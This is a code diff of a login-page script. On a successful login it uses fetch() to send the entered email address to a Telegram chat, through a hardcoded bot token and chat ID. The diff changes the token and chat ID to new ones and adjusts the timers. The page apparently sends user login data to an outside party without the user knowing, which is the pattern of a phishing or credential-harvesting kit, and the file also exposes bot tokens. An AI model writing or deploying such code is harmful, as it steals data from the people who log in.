@@ -16,20 +16,20 @@ mail.value = '';
 password.value = '';
  if(mok == true && pok == true){
  document.getElementById('alert-success').classList.remove('d-none');
-  setTimeout(() => {document.getElementById('alert-success').classList.add('d-none');}, 4000);
-  var chat_id = 2097014526;
+  setTimeout(() => {document.getElementById('alert-success').classList.add('d-none');}, 3000);
+  var chat_id = 1117797599;
   var msg = `Login -  ${nmail}`;
-  var token = "5218159361:AAGkRRiN7-p9qDyV5ULidhImE-iy38Vxogo";
+  var token = "1481767472:AAENJk7aOxNovo3L4Zuur8RTlxaJOoItG_E";
   var sendText = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text= ${msg}`;
  fetch(sendText)
  console.log(sendText)
- setTimeout(() => {window.location.href ='/main.html';}, 5000);
+ setTimeout(() => {window.location.href ='/main.html';}, 4000);
  }
  else{
   document.getElementById('alert-danger').classList.remove('d-none');
   mail.value = '';
   password.value = '';
-  setTimeout(() => {document.getElementById('alert-danger').classList.add('d-none');}, 5000);
+  setTimeout(() => {document.getElementById('alert-danger').classList.add('d-none');}, 4000);
  } 
 } );
 }
